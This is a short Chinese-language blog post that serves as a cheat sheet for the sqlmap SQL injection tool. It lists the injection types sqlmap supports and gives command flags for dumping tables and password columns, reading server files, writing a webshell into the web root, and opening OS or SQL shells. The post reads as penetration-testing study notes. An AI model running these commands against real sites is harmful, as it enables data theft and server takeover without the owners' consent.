---
title: sqlmap
author: Pp1ove
avatar: \img\custom\head.jpg
authorLink: 
authorAbout: Pp1ove
authorDesc: 一个好奇的人
categories: 工具
comments: false
date: 2021-01-29 19:58:30
tags: sqlmap
photos: \img\article\11.png
---

## 功能介绍

1.dump数据

2.读写文件

3.绕web防火墙（waf）

4.SqlMapAPI

## 支持的注入类型

1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

4、联合查询注入，可以使用union的情况下的注入。（适合用于通过循环直接输出联合查询结果，否则只会显示第一项结果）

5、堆查询注入，可以同时执行多条语句的执行时的注入。

## 相关命令

```
-u ""                            #测试是否有注入
-u "" --current-db 				 #查看当前数据库
-u "" -D dbname --tables	 	#查看所有表
-u "" -D dbname -T tablename --columns #查字段
-u "" -D dbname -T tablename -C id,name,passwd --dump#查数据
-u "" --cookie="PHPSESSID=613DAD....."  #使用cookie
-u "" --file-read="C:\phpStudy\www\index.php" #读取铭感文件，需要用绝对路径
-u "" --file-write="./shell.php" --file-dest "C:\phpStudy\www\a.php" #写webshell
-u ""  --data "uname=1&passwd" #post注入
-u "" --os-shell  #获取shell
-u "" --sql-shell --no-cast #获取数据库权限
```

SqlMapAPI

```
python sqlmapapi.py -s -h  -p 
```

